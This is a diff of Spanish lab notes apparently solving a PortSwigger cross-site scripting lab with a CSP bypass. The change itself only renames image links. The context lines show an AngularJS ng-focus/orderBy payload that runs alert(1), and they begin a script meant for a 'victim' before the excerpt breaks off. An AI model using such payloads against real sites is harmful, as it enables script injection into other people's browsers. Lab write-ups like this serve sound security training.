@@ -10,8 +10,8 @@ Solucion
 De igual forma toca buscar en cheet sheet por CSP y utilizar el payload (https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 <input ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>
 
-![Pasted image 20250718172329.png](imagenes/Pasted image 20250718172329.png)
-![Pasted image 20250718172623.png](imagenes/Pasted image 20250718172623.png)
+![Pasted_image_20250718172329.png](Imagenes/Pasted_image_20250718172329.png)
+![Pasted_image_20250718172623.png](Imagenes/Pasted_image_20250718172623.png)
 
 y a nuestra victima lo mandaraiamos asi
 <script>
